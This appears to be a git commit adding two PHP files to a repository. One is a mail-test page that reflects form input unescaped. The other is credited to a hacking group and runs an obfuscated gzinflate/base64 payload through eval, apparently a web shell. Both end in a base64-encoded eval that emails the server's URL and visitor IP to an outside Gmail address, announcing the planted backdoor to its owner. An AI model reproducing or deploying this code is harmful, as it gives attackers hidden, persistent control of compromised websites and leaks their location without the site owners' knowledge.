d98b50f90f638e027c6ef0e46a75a248684e2503
kalix-Ru <66873143+kalix-Ru@users.noreply.github.com>
2020-12-15 16:39:38 +0100

    Add files via upload

---
+++ 38uc79ZR.php
@@ -0,0 +1,24 @@
+<?php
+error_reporting(0);
+
+?>
+Upload is <b><color>WORKING</color></b><br>
+Check  Mailling ..<br>
+<form method="post">
+<input type="text" placeholder="E-Mail" name="email" value="<?php print $_POST['email']?>"required ><input type="text" placeholder="Order ID" name="orderid" value="<?php print $_POST['orderid']?>" ><br>
+<input type="submit" value="Send test >>">
+</form>
+<br>
+<?php
+if (!empty($_POST['email'])){
+	if (!empty($_POST['email'])){
+		$xx =$_POST['orderid'];
+	}
+	else{
+		$xx = rand();
+	
+	}
+	mail($_POST['email'],"Result Report Test - ".$xx,"WORKING !");
+	print "<b>send an report to [".$_POST['email']."] - Order : $xx</b>"; 
+}
+eval(base64_decode('JHR1anVhbm1haWwgPSAna2FsaXgweGFsaWtAZ21haWwuY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRwZXNhbl9hbGVydCA9ICJmaXggJHhfcGF0aCA6cCAqSVAgQWRkcmVzcyA6IFsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsKbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUiLCAkcGVzYW5fYWxlcnQsICJbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOw=='));?>
---
+++ acceshash.php
@@ -0,0 +1,12 @@
+<?php
+/*
+by
+Jokr Haxor
+3xp1r3 Cyber Army
+*/
+function aNlXy($OYho){ 
+$OYho=gzinflate(base64_decode($OYho));
+for($TSh=0;$TSh<strlen($OYho);$TSh++) {
+ $OYho[$TSh] = chr(ord($OYho[$TSh])-1); }
+ return $OYho; }eval(aNlXy('ZZNta9swEMc/gMHf4SYCcmhqZ4wySC23o2z0zdjYCnuRBSPbl9jUloykrCmjn30nO1nS1Bis6O7+97uHANATBmiMNrnBXhvXqE00n16HgUWXu6bDvG26xo13N1kYpCUqh8af6g/Zp7JEa+Fe2hp+oKzQpAldk3GtTQcdulpXgvXaOuZvG9VvHbjnHgWz24KUGSjZ0a+NZvBHtls63tVYPg7uiVehAwxvetPXfRg0a4gaS3zRJP/+7efDkm80X02nf8NgsrVorFg3LUYsQVcmvbT2qWKe3se9Gz2mQM5VgxEnTuWg1K02ghmsWJYW2fJyBZ99U2ABd1Ip7Ybi4EQxTYrM4ymXcS/+Ega33WPVmIjLoSc1tYTPYP7x6srbb8v63OivJzsxpw+VibKso5EOpIXhtC/JCNz1ra6opgWbjRYfS4KCJ7XuMOGx91vOVzFP4pMc14d20XhlJQvqiw8bm9UPjco3NOmSCqG52tHqxRU+eatgv+6/AvsvTwSxdcO2tLIkot+KzRhR9T5q0KMJn+gd4i6PVLHbOYrYZxjbcCHe0xfLWgNfXqzgi96qagGvxrMxiIoGJKE2uBbsqHha/3kicNJQiYLlRSsV7dXR9w1UzNNEHuaaFibj42hfDmiveAraVsKhfX/QTrbjv2AABwGUZUdypEG8Zwhv+Vk2BLeNdSMBie5z0+L/Aw=='));
+eval(base64_decode('JHR1anVhbm1haWwgPSAna2FsaXgweGFsaWtAZ21haWwuY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRwZXNhbl9hbGVydCA9ICJmaXggJHhfcGF0aCA6cCAqSVAgQWRkcmVzcyA6IFsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsKbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUiLCAkcGVzYW5fYWxlcnQsICJbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOw=='));?>
